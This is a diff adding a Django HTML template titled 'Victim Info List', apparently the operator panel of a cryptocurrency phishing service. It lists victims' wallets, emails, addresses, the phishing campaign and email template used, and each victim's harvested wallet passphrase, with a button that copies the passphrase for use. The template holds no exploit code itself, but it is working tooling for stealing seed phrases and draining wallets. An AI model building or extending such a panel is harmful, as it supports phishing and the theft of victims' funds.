@@ -1,0 +1,109 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Victim Info List</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #007BFF;
+            color: white;
+        }
+        .copy-btn {
+            background-color: #007BFF;
+            color: white;
+            padding: 6px 12px;
+            border: none;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background-color: #0056b3;
+        }
+        .copied-message {
+            display: none;
+            color: green;
+            font-size: 14px;
+        }
+        .fade {
+            animation: fadeOut 2s forwards;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Victim Info List</h1>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Wallet</th>
+                <th>Recipient Email</th>
+                <th>Passphrase</th>
+                <th>Address</th>
+                <th>Campaign Cost</th>
+                <th>Email Template</th>
+                <th>Copy Passphrase</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for victim in victim_infos %}
+            <tr>
+                <td>{{ victim.wallet.name }}</td>
+                <td>{{ victim.recipient_email }}</td>
+                <td><span id="passphrase-{{ victim.id }}">{{ victim.passphrase }}</span></td>
+                <td>{{ victim.address }}</td>
+                <td>{{ victim.campaign.email_template.xp_cost }}</td>
+                <td>{{ victim.campaign.email_template }}</td>
+                <td>
+                    <button class="copy-btn" onclick="copyToClipboard('{{ victim.id }}')">Copy</button>
+                    <span id="copied-message-{{ victim.id }}" class="copied-message">Copied to clipboard!</span>
+                </td>
+            </tr>
+            {% empty %}
+            <tr>
+                <td colspan="7">No victim info available.</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+
+    <script>
+        function copyToClipboard(victimId) {
+            const passphraseElement = document.getElementById(`passphrase-${victimId}`);
+            const passphrase = passphraseElement.textContent;
+            navigator.clipboard.writeText(passphrase).then(function() {
+                const copiedMessage = document.getElementById(`copied-message-${victimId}`);
+                copiedMessage.style.display = 'inline';
+                copiedMessage.classList.add('fade');
+                setTimeout(function() {
+                    copiedMessage.style.display = 'none';
+                    copiedMessage.classList.remove('fade');
+                }, 2000);
+            });
+        }
+    </script>
+
+</body>
+</html>
